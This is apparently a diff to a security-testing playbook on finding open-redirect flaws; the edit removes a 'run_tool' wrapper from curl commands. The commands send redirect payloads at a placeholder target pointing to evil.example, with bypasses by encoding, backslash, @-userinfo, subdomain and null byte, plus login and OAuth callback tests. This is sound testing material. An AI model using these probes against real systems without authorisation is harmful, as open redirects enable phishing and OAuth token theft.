@@ -21,7 +21,7 @@ origin: AI Threat Hunting
 ```bash
 # Common redirect parameter names
 for param in redirect url next return returnTo goto dest target rurl callback continue redir forward ref; do
-  code=$(run_tool curl -s -o /dev/null -w "%{http_code}" "http://target/?${param}=https://evil.example")
+  code=$(curl -s -o /dev/null -w "%{http_code}" "http://target/?${param}=https://evil.example")
   [ "$code" = "302" ] || [ "$code" = "301" ] || [ "$code" = "303" ] && echo "  $param → $code (potential redirect)"
 done
 ```
@@ -31,30 +31,30 @@ done
 ```bash
 TARGET="http://target/redirect?url="
 # Direct external URL
-run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https://evil.example"
+curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https://evil.example"
 # Protocol-relative
-run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}//evil.example"
+curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}//evil.example"
 # Backslash
-run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https://evil.example%5c"
+curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https://evil.example%5c"
 # @ bypass (user@host)
-run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https://target@evil.example"
+curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https://target@evil.example"
 # Subdomain bypass
-run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https://target.evil.example"
+curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https://target.evil.example"
 # URL encoding
-run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https%3A%2F%2Fevil.example"
+curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https%3A%2F%2Fevil.example"
 # Double URL encoding
-run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https%253A%252F%252Fevil.example"
+curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https%253A%252F%252Fevil.example"
 # Null byte
-run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https://evil.example%00target.example"
+curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https://evil.example%00target.example"
 ```
 
 ### 3. Test in Authentication Flows
 
 ```bash
 # Post-login redirect
-run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "http://target/login?redirect=https://evil.example"
+curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "http://target/login?redirect=https://evil.example"
 # OAuth callback
-run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "http://target/oauth/callback?redirect_uri=https://evil.example"
+curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "http://target/oauth/callback?redirect_uri=https://evil.example"
 ```
 
 ## What to Record
